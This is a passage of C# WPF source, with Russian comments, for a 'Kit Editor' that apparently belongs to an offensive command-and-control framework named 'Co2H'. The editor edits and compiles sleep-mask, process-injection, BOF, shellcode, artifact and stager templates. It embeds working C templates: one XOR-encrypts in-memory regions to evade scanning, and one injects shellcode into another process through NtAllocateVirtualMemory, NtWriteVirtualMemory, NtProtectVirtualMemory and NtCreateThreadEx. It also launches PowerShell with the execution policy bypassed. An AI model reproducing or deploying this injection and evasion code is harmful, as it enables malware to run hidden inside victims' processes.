                    "    for (i = 0; i < ctx->region_count; i++) {\n" +
                    "        uint8_t* p = (uint8_t*)ctx->regions[i].base;\n" +
                    "        for (uint32_t j = 0; j < ctx->regions[i].size; j++)\n" +
                    "            p[j] ^= ctx->key[j & 15];\n" +
                    "\n" +
                    "        base = ctx->regions[i].base;\n" +
                    "        sz   = ctx->regions[i].size;\n" +
                    "        ctx->NtProtectVirtualMemory(ctx->process_handle, &base, &sz,\n" +
                    "                                    ctx->regions[i].original_prot, &old_prot);\n" +
                    "        ctx->FlushInstructionCache(ctx->process_handle,\n" +
                    "                                   ctx->regions[i].base,\n" +
                    "                                   ctx->regions[i].size);\n" +
                    "    }\n" +
                    "}\n";
            }
            else
            {
                return
                    "// " + name + ".inject -- Co2H process inject template.\n" +
                    "//\n" +
                    "// Position-independent code (PIC): no globals, no string literals,\n" +
                    "// no CRT. Use only function pointers from InjectCtx.\n" +
                    "// Return INJECT_OK on success, INJECT_ERR_* on failure.\n" +
                    "\n" +
                    "#include \"../../process_inject_api.h\"\n" +
                    "\n" +
                    "// ---- ENTRY POINT (must be first defined function) -------------------------\n" +
                    "\n" +
                    "uint32_t __cdecl process_inject_entry(InjectCtx* ctx) {\n" +
                    "    NTSTATUS  st;\n" +
                    "    PVOID     remote = NULL;\n" +
                    "    SIZE_T    sz     = ctx->payload_len;\n" +
                    "    ULONG     old_prot;\n" +
                    "    HANDLE    hThread = NULL;\n" +
                    "\n" +
                    "    // 1. Allocate RW memory in target process.\n" +
                    "    st = ctx->NtAllocateVirtualMemory(ctx->target_process, &remote, 0, &sz,\n" +
                    "                                     /*MEM_COMMIT|MEM_RESERVE*/ 0x3000,\n" +
                    "                                     /*PAGE_READWRITE*/ 0x04);\n" +
                    "    if (st < 0) return INJECT_ERR_ALLOC;\n" +
                    "    ctx->out_remote_base = remote;\n" +
                    "\n" +
                    "    // 2. Write shellcode.\n" +
                    "    SIZE_T written = 0;\n" +
                    "    st = ctx->NtWriteVirtualMemory(ctx->target_process, remote,\n" +
                    "                                  (PVOID)ctx->payload,\n" +
                    "                                  ctx->payload_len, &written);\n" +
                    "    if (st < 0) return INJECT_ERR_WRITE;\n" +
                    "\n" +
                    "    // 3. Flip to RX.\n" +
                    "    sz = ctx->payload_len;\n" +
                    "    st = ctx->NtProtectVirtualMemory(ctx->target_process, &remote, &sz,\n" +
                    "                                    /*PAGE_EXECUTE_READ*/ 0x20, &old_prot);\n" +
                    "    if (st < 0) return INJECT_ERR_PROTECT;\n" +
                    "\n" +
                    "    // 4. Create remote thread.\n" +
                    "    st = ctx->NtCreateThreadEx(&hThread, /*THREAD_ALL_ACCESS*/ 0x1FFFFF, NULL,\n" +
                    "                              ctx->target_process, remote, NULL,\n" +
                    "                              0, 0, 0, 0, NULL);\n" +
                    "    if (st < 0) return INJECT_ERR_THREAD;\n" +
                    "\n" +
                    "    ctx->out_thread = hThread;\n" +
                    "    return INJECT_OK;\n" +
                    "}\n";
            }
        }

        // Раскрыть нужный корневой узел и выделить созданный template.
        private void ExpandAndSelect(string kit, string name)
        {
            string targetTag = "kit:" + kit;
            foreach (var obj in tvTemplates.Items)
            {
                var node = obj as TreeViewItem;
                if (node == null) continue;
                if ((node.Tag as string) != targetTag) continue;

                node.IsExpanded = true;
                foreach (var childObj in node.Items)
                {
                    var child = childObj as TreeViewItem;
                    if (child == null) continue;
                    string header = (child.Header as string ?? "").Trim();
                    if (string.Equals(header, name, StringComparison.OrdinalIgnoreCase))
                    {
                        child.IsSelected = true;
                        child.BringIntoView();
                        return;
                    }
                }
                return;
            }
        }

        private void OnOpen(object sender, RoutedEventArgs e)
        {
            if (_modified && !ConfirmDiscard()) return;

            var dlg = new Microsoft.Win32.OpenFileDialog
            {
                Filter = "C source (*.c)|*.c|Header (*.h)|*.h|All (*.*)|*.*",
                InitialDirectory = _kitRoot ?? AppDomain.CurrentDomain.BaseDirectory
            };

            if (dlg.ShowDialog() == true)
            {
                LoadFile(dlg.FileName);
            }
        }

        private void OnSave(object sender, RoutedEventArgs e)
        {
            if (_currentFile == null)
            {
                // Save As
                var dlg = new Microsoft.Win32.SaveFileDialog
                {
                    Filter = "C source (*.c)|*.c|All (*.*)|*.*",
                    InitialDirectory = _kitRoot ?? AppDomain.CurrentDomain.BaseDirectory
                };
                if (dlg.ShowDialog() == true)
                    _currentFile = dlg.FileName;
                else
                    return;
            }

            try
            {
                File.WriteAllText(_currentFile, tbEditor.Text, Encoding.UTF8);
                _modified = false;
                SetStatus("Saved: " + Path.GetFileName(_currentFile));
            }
            catch (Exception ex)
            {
                SetStatus("ERROR: " + ex.Message);
            }
        }

        private void OnReload(object sender, RoutedEventArgs e)
        {
            if (_currentFile != null && File.Exists(_currentFile))
            {
                LoadFile(_currentFile);
            }
        }

        private void OnCompile(object sender, RoutedEventArgs e)
        {
            if (_currentFile == null)
            {
                SetStatus("ERROR: no file to compile");
                return;
            }

            // Сохраняем перед компиляцией
            if (_modified)
            {
                try { File.WriteAllText(_currentFile, tbEditor.Text, Encoding.UTF8); }
                catch (Exception ex) { SetStatus("Save failed: " + ex.Message); return; }
                _modified = false;
            }

            // Определяем какой build_all.bat использовать.
            // Порядок проверок важен: 'bof' — короткое слово, проверяем его последним
            // и через нормализованный путь, чтобы не сматчиться на случайные подстроки.
            string buildScript = null;
            string norm = _currentFile.Replace('/', '\\');
            if (norm.IndexOf("\\sleepmask\\", StringComparison.OrdinalIgnoreCase) >= 0)
            {
                buildScript = Path.Combine(_sleepMaskDir, "build_all.bat");
            }
            else if (norm.IndexOf("\\processinject\\", StringComparison.OrdinalIgnoreCase) >= 0)
            {
                buildScript = Path.Combine(_processInjectDir, "build_all.bat");
            }
            else if (norm.IndexOf("\\bof\\", StringComparison.OrdinalIgnoreCase) >= 0)
            {
                buildScript = Path.Combine(_bofDir, "build_all.bat");
            }
            else if (norm.IndexOf("\\shellcode\\", StringComparison.OrdinalIgnoreCase) >= 0)
            {
                buildScript = Path.Combine(_shellcodeDir, "build_all.bat");
            }
            else if (norm.IndexOf("\\artifact\\", StringComparison.OrdinalIgnoreCase) >= 0)
            {
                buildScript = Path.Combine(_artifactDir, "build_all.bat");
            }
            else if (norm.IndexOf("\\stagers\\", StringComparison.OrdinalIgnoreCase) >= 0)
            {
                // Стейджер - конечный артефакт (.ps1/.hta/.vbs/.wsf).
                // Компилировать нечего, но для подпапки с build.ps1 - запускаем его.
                string dir = Path.GetDirectoryName(_currentFile);
                string buildPs1 = Path.Combine(dir, "build.ps1");
                if (File.Exists(buildPs1))
                {
                    RunPowerShell(buildPs1);
                    return;
                }
                SetStatus("Stager is a ready-to-use artifact, no compile step");
                return;
            }

            if (buildScript == null || !File.Exists(buildScript))
            {
                SetStatus("ERROR: build script not found");
                return;
            }

            SetStatus("Compiling...");
            RunBuild(buildScript);
        }

        private void RunPowerShell(string ps1File)
        {
            string workDir = Path.GetDirectoryName(ps1File);
            SetStatus("Running PowerShell: " + Path.GetFileName(ps1File));
            var psi = new ProcessStartInfo
            {
                FileName = "powershell.exe",
                Arguments = "-NoProfile -ExecutionPolicy Bypass -File \"" + ps1File + "\"",
                WorkingDirectory = workDir,
                UseShellExecute = false,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                CreateNoWindow = true,
                StandardOutputEncoding = Encoding.UTF8,
                StandardErrorEncoding = Encoding.UTF8
            };
            RunProc(psi);
        }

        private void RunBuild(string batFile)
        {
            string workDir = Path.GetDirectoryName(batFile);
            var psi = new ProcessStartInfo
            {
                FileName = "cmd.exe",
                Arguments = "/c \"" + batFile + "\"",
                WorkingDirectory = workDir,
                UseShellExecute = false,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                CreateNoWindow = true,
                StandardOutputEncoding = Encoding.GetEncoding(866),
                StandardErrorEncoding = Encoding.GetEncoding(866)
            };
            RunProc(psi);
        }

        // Общая часть: запуск процесса с потоковым выводом stdout/stderr
        // в открытое сразу окно. Завершение обновляет заголовок и статус.
        private void RunProc(ProcessStartInfo psi)
        {
            // Окно вывода создаём заранее, пустое, заголовок "Building..."
            var output = CreateBuildOutputWindow();
            output.Win.Show();

            var proc = new Process { StartInfo = psi, EnableRaisingEvents = true };

            proc.OutputDataReceived += (s, ev) =>
            {
                if (ev.Data == null) return;
                AppendBuildLine(output, ev.Data);
            };
            proc.ErrorDataReceived += (s, ev) =>
            {
                if (ev.Data == null) return;
                AppendBuildLine(output, "[ERR] " + ev.Data);
            };
            proc.Exited += (s, ev) =>
            {
                int code = proc.ExitCode;
                Dispatcher.Invoke(() =>
                {
                    FinalizeBuildOutput(output, code == 0, code);
                    SetStatus(code == 0
                        ? "Build OK (exit 0)"
                        : "Build FAILED (exit " + code + ")");
                });
            };

            try
            {
                proc.Start();
                proc.BeginOutputReadLine();
                proc.BeginErrorReadLine();
            }
            catch (Exception ex)
            {
                SetStatus("Launch failed: " + ex.Message);
                AppendBuildLine(output, "[X] Launch failed: " + ex.Message);
            }
        }

        // Хэндлы на окно сборки, чтобы можно было дописывать строки и менять заголовок.
        private class BuildOutputCtx
        {
            public Window Win;
            public TextBox Output;
            public TextBlock TitleText;
        }

        private void AppendBuildLine(BuildOutputCtx ctx, string line)
        {
            // Маршалинг в UI-поток - OutputDataReceived приходит из пула.
            Dispatcher.BeginInvoke(new Action(() =>
            {
                if (ctx.Output == null) return;
                ctx.Output.AppendText(line + Environment.NewLine);
                ctx.Output.ScrollToEnd();
            }));
        }

        private void FinalizeBuildOutput(BuildOutputCtx ctx, bool success, int exitCode)
        {
            string title = success ? "Build OK" : ("Build FAILED (exit " + exitCode + ")");
            ctx.Win.Title = title;
            ctx.TitleText.Text = title;
            ctx.TitleText.Foreground = success
                ? FindResource("AccentBrush") as Brush
                : new SolidColorBrush(Color.FromRgb(0xFF, 0x66, 0x66));

            // Если был fail - подкрашиваем текст в красноватый, как было в финальном окне.
            if (!success)
            {
                ctx.Output.Foreground = new SolidColorBrush(Color.FromRgb(255, 120, 120));
            }
        }

        // Создаёт окно для потокового вывода сборки. Возвращает контекст
        // с хэндлами, чтобы из event handlers процесса можно было
        // дописывать строки и менять заголовок.
        private BuildOutputCtx CreateBuildOutputWindow()
        {
            string title = "Building...";

            var win = new Window
            {
                Title = title,
                Width = 700,
                Height = 450,
                Background = FindResource("BgBrush") as Brush,
                BorderBrush = FindResource("AccentDimBrush") as Brush,
                BorderThickness = new Thickness(1),
                WindowStartupLocation = WindowStartupLocation.CenterOwner,
                Owner = this,
                WindowStyle = WindowStyle.None,
                ResizeMode = ResizeMode.CanResize
            };
            System.Windows.Shell.WindowChrome.SetWindowChrome(win,
                new System.Windows.Shell.WindowChrome
                {
                    CaptionHeight = 28,
                    GlassFrameThickness = new Thickness(0),
                    UseAeroCaptionButtons = false,
                    ResizeBorderThickness = new Thickness(4)
                });

            // Корневая разметка
            var grid = new Grid();
            grid.RowDefinitions.Add(new RowDefinition { Height = new GridLength(28) });
            grid.RowDefinitions.Add(new RowDefinition { Height = new GridLength(1, GridUnitType.Star) });

            // ---- Заголовок ----
            var titleBar = new Border
            {
                Background = FindResource("PanelBrush") as Brush,
                BorderBrush = FindResource("BorderBrush") as Brush,
                BorderThickness = new Thickness(0, 0, 0, 1)
            };
            var titleDock = new DockPanel { LastChildFill = true };

            // Заголовок "Building..." пока процесс работает - желтоватый.
            Brush titleColor = new SolidColorBrush(Color.FromRgb(0xFF, 0xD0, 0x40));

            var closeBtn = new Button
            {
                Style = FindResource("TitleBarCloseButton") as Style,
                Content = "✕"
            };
            System.Windows.Shell.WindowChrome.SetIsHitTestVisibleInChrome(closeBtn, true);
            closeBtn.Click += (s, e) => win.Close();
            DockPanel.SetDock(closeBtn, Dock.Right);

            var titleText = new TextBlock
            {
                Text = title,
                Foreground = titleColor,
                FontFamily = new FontFamily("Consolas"),
                FontSize = 12,
                FontWeight = FontWeights.Bold,
                VerticalAlignment = VerticalAlignment.Center,
                Margin = new Thickness(10, 0, 0, 0)
            };

            titleDock.Children.Add(closeBtn);
            titleDock.Children.Add(titleText);
            titleBar.Child = titleDock;
            Grid.SetRow(titleBar, 0);
            grid.Children.Add(titleBar);

            // ---- Поле вывода (пустое, заполняется потоково) ----
            var tb = new TextBox
            {
                Text = "",
                IsReadOnly = true,
                IsUndoEnabled = false,
                Background = new SolidColorBrush(Color.FromRgb(5, 5, 5)),
                Foreground = FindResource("TextBrush") as Brush,
                FontFamily = new FontFamily("Consolas"),
                FontSize = 12,
                TextWrapping = TextWrapping.NoWrap,
                VerticalScrollBarVisibility = ScrollBarVisibility.Auto,
                HorizontalScrollBarVisibility = ScrollBarVisibility.Auto,
                BorderThickness = new Thickness(0),
                Padding = new Thickness(8, 6, 8, 6),
                CaretBrush = FindResource("AccentBrush") as Brush
            };
            Grid.SetRow(tb, 1);
            grid.Children.Add(tb);

            win.Content = grid;
            return new BuildOutputCtx { Win = win, Output = tb, TitleText = titleText };
        }

        // ----- Helpers -----

        private void SetStatus(string msg)
        {
            tbStatus.Text = msg;
        }

        private bool ConfirmDiscard()
        {
            var result = MessageBox.Show(
                "Unsaved changes will be lost. Continue?",
                "Kit Editor",
                MessageBoxButton.YesNo,
                MessageBoxImage.Warning);
            return result == MessageBoxResult.Yes;
        }
    }
}
